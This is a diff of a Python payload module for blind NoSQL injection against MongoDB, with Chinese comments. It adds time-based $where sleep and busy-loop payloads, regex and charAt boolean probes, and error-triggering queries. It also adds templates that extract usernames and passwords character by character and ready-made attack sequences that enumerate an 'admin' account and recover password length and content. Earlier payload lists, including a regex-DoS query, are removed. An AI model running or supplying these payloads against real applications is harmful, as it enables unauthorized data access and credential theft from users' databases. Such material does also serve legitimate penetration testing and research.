@@ -1,41 +1,121 @@
 """
-MongoDB 盲注載荷
-包含基於時間、布爾和錯誤的各種盲注技術
+MongoDB盲注攻击载荷
+包含时间盲注、布尔盲注和错误盲注技术
 """
 
 import random
 
-# 時間盲注 - 基於查詢執行時間的注入
+# 时间盲注载荷 - 通过延时来判断条件是否为真
 TIME_BASED_PAYLOADS = [
+    # 基本时间盲注
+    {"$where": "function(){sleep(3000)}"},
+    {"$where": "function(){sleep(3000); return true;}"},
+    
+    # 条件时间盲注
+    {"$where": "function(){if(this.username=='admin'){sleep(3000)}; return true;}"},
+    {"$where": "function(){if(this.password.length>5){sleep(3000)}; return true;}"},
+    {"$where": "function(){if(this.password.substr(0,1)=='a'){sleep(3000)}; return true;}"},
+    
+    # 手动延时
+    {"$where": "function(){var d=new Date(); while(new Date()-d<3000){}}; return true;"},
+    {"$where": "function(){var i=0; while(i<1000000){i++;}; return true;}"},
+    
+    # 递归延时
+    {"$function": {"body": "function(){let i=0; while(i<1000000){i++;}; return true;}"}},
+    {"$function": {"body": "function f(x){if(x>0)f(x-1);else{sleep(3000);}} f(5); return true;"}},
+]
+
+# 布尔盲注载荷 - 通过真/假条件判断数据内容
+BOOLEAN_BASED_PAYLOADS = [
+    # 用户名检测
+    {"username": {"$regex": "^a"}},
+    {"username": {"$regex": "^admin"}},
+    {"username": {"$in": ["admin", "root", "administrator"]}},
+    
+    # 密码信息提取
+    {"$where": "this.password.length > 5"},
+    {"$where": "this.password.length < 10"},
+    {"$where": "this.password.charAt(0) == 'a'"},
+    {"$where": "this.password.charCodeAt(0) > 97"},
+    
+    # 数据类型检测
+    {"username": {"$type": 2}},  # 检测是否为字符串类型
+    {"password": {"$exists": True}},  # 检测密码字段是否存在
+    
+    # 条件组合
+    {"$or": [{"username": {"$regex": "^a"}}, {"email": {"$regex": "gmail"}}]},
+    {"$and": [{"username": {"$regex": "^a"}}, {"password": {"$regex": "^p"}}]},
+]
+
+# 错误盲注载荷 - 通过错误信息判断条件
+ERROR_BASED_PAYLOADS = [
+    # 类型错误
+    {"username": {"$concat": ["admin", 5]}},  # 字符串和数字连接会导致错误
+    {"username": {"$add": ["admin", "password"]}},  # 尝试对字符串执行数学运算
+    
+    # 除零错误
+    {"$where": "this.value/0 == 0"},
+    {"$expr": {"$divide": ["$value", 0]}},
+    
+    # 函数参数错误
+    {"username": {"$substr": ["admin", -1, 5]}},  # 负数索引会导致错误
+    {"username": {"$substrBytes": ["admin", 10, 5]}},  # 超出范围的索引
+    
+    # 正则表达式错误
+    {"username": {"$regex": "["}},  # 无效的正则表达式
+    {"username": {"$regex": "(?=.*"}},  # 无效的前瞻断言
+]
+
+# 盲注数据提取载荷模板
+DATA_EXTRACTION_TEMPLATES = [
+    # 提取用户名第N个字符
+    {"template": "this.username.charAt({pos}) == '{char}'", "description": "检测用户名指定位置的字符"},
+    {"template": "this.username.substr({pos}, 1) == '{char}'", "description": "提取用户名子字符串"},
+    
+    # 提取密码信息
+    {"template": "this.password.length == {length}", "description": "检测密码长度"},
+    {"template": "this.password.charAt({pos}) == '{char}'", "description": "检测密码指定位置的字符"},
+    {"template": "this.password.charCodeAt({pos}) == {code}", "description": "检测密码字符的ASCII码"},
+    {"template": "this.password.charCodeAt({pos}) > {code}", "description": "比较密码字符的ASCII码范围"},
+    
+    # 提取其他字段
+    {"template": "this.{field} !== undefined", "description": "检测字段是否存在"},
+    {"template": "this.{field}.indexOf('{substring}') != -1", "description": "检测字段是否包含特定子字符串"},
+    {"template": "Array.isArray(this.{field})", "description": "检测字段是否为数组类型"},
+]
+
+# 完整盲注攻击链
+BLIND_ATTACK_SEQUENCES = [
     {
-        "name": "基本時間延遲",
-        "value": {"$where": f"sleep({random.randint(2000, 3000)}) || true"},
-        "description": "使用sleep函數導致查詢延遲",
-        "expected_delay": 2000  # 毫秒
+        "name": "用户名枚举",
+        "type": "boolean",
+        "steps": [
+            {"payload": {"username": {"$regex": "^a"}}, "description": "检测以'a'开头的用户名"},
+            {"payload": {"username": {"$regex": "^ad"}}, "description": "检测以'ad'开头的用户名"},
+            {"payload": {"username": {"$regex": "^adm"}}, "description": "检测以'adm'开头的用户名"},
+            {"payload": {"username": {"$regex": "^admi"}}, "description": "检测以'admi'开头的用户名"},
+            {"payload": {"username": {"$regex": "^admin"}}, "description": "检测以'admin'开头的用户名"}
+        ]
     },
     {
-        "name": "條件時間延遲",
-        "value": {"$where": f"if(this.username=='admin'){{sleep({random.randint(2000, 3000)})}}; return true"},
-        "description": "根據條件執行時間延遲，可用於數據提取",
-        "expected_delay": 2000  # 毫秒
+        "name": "密码长度检测",
+        "type": "time",
+        "steps": [
+            {"payload": {"$where": "function(){if(this.password.length>0){sleep(1000)}; return true;}"}, "description": "密码长度 > 0"},
+            {"payload": {"$where": "function(){if(this.password.length>5){sleep(1000)}; return true;}"}, "description": "密码长度 > 5"},
+            {"payload": {"$where": "function(){if(this.password.length>8){sleep(1000)}; return true;}"}, "description": "密码长度 > 8"},
+            {"payload": {"$where": "function(){if(this.password.length>10){sleep(1000)}; return true;}"}, "description": "密码长度 > 10"}
+        ]
     },
     {
-        "name": "嵌套循環延遲",
-        "value": {"$where": "var x=''; for(var i=0;i<1000;i++){for(var j=0;j<100;j++){x+='a'}}; return true"},
-        "description": "使用嵌套循環導致CPU密集操作達到延遲效果",
-        "expected_delay": 1000  # 毫秒
-    },
-    {
-        "name": "比較延遲",
-        "value": {"$where": f"var d=new Date(); var s=d.getTime(); while((new Date()).getTime()-s<{random.randint(1000, 2000)}){{}}; return true"},
-        "description": "使用時間比較實現延遲",
-        "expected_delay": 1000  # 毫秒
-    },
-    {
-        "name": "正則表達式DoS", 
-        "value": {"$where": "var s = Array(100000).join('a'); s.match(/((a+)+)+$/); return true"},
-        "description": "使用易觸發指數回溯的正則表達式導致延遲",
-        "expected_delay": 5000  # 毫秒
+        "name": "密码内容提取",
+        "type": "boolean",
+        "steps": [
+            {"payload": {"$where": "this.password.charAt(0) == 'p'"}, "description": "检测密码首字符是否为'p'"},
+            {"payload": {"$where": "this.password.charAt(1) == 'a'"}, "description": "检测密码第二个字符是否为'a'"},
+            {"payload": {"$where": "this.password.charAt(2) == 's'"}, "description": "检测密码第三个字符是否为's'"},
+            {"payload": {"$where": "this.password.charAt(3) == 's'"}, "description": "检测密码第四个字符是否为's'"}
+        ]
     }
 ]
 
@@ -55,40 +135,6 @@ def generate_time_payload(delay_ms=2000, condition=None):
         return {"$where": f"if({condition}){{sleep({delay_ms})}}; return true"}
     else:
         return {"$where": f"sleep({delay_ms}) || true"}
-
-# 布爾盲注 - 基於查詢結果的注入
-BOOLEAN_PAYLOADS = [
-    {
-        "name": "簡單布爾注入",
-        "value": {"$where": "this.username.charAt(0) === 'a'"},
-        "description": "檢測用戶名首字母是否為'a'",
-        "data_extraction": True
-    },
-    {
-        "name": "字符比較",
-        "value": {"$where": "this.password.charCodeAt(0) > 100"},
-        "description": "檢測密碼首字節ASCII值是否大於100",
-        "data_extraction": True
-    },
-    {
-        "name": "長度比較",
-        "value": {"$where": "this.username.length > 5"},
-        "description": "檢測用戶名長度是否大於5",
-        "data_extraction": True
-    },
-    {
-        "name": "字段存在檢測",
-        "value": {"$where": "Object.keys(this).indexOf('admin') >= 0"},
-        "description": "檢測文檔是否包含admin字段",
-        "data_extraction": True
-    },
-    {
-        "name": "數組包含檢測",
-        "value": {"$where": "Array.isArray(this.roles) && this.roles.indexOf('admin') >= 0"},
-        "description": "檢測角色數組是否包含admin",
-        "data_extraction": True
-    }
-]
 
 # 自定義布爾盲注生成
 def generate_boolean_payload(field, position, character=None, operation=None):
@@ -110,34 +156,6 @@ def generate_boolean_payload(field, position, character=None, operation=None):
         return {"$where": f"this.{field}.charCodeAt({position}) {operation} 0"}
     else:
         return {"$where": f"this.{field}.length > {position}"}
-
-# 錯誤盲注 - 基於錯誤的注入
-ERROR_BASED_PAYLOADS = [
-    {
-        "name": "空指針錯誤",
-        "value": {"$where": "if(this.username=='admin'){return x.a}else{return true}"},
-        "description": "根據條件觸發空指針異常",
-        "data_extraction": True
-    },
-    {
-        "name": "類型錯誤",
-        "value": {"$where": "if(this.username=='admin'){return true+[]}else{return true}"},
-        "description": "根據條件觸發類型錯誤",
-        "data_extraction": True
-    },
-    {
-        "name": "語法錯誤",
-        "value": {"$where": "if(this.username=='admin'){return eval('x:')}else{return true}"},
-        "description": "根據條件觸發語法錯誤",
-        "data_extraction": True
-    },
-    {
-        "name": "數組越界",
-        "value": {"$where": "if(this.username=='admin'){return this.username[1000].length}else{return true}"},
-        "description": "根據條件觸發數組越界錯誤",
-        "data_extraction": True
-    }
-]
 
 # 完整的數據提取盲注套件
 def get_data_extraction_payloads(target_field="password"):
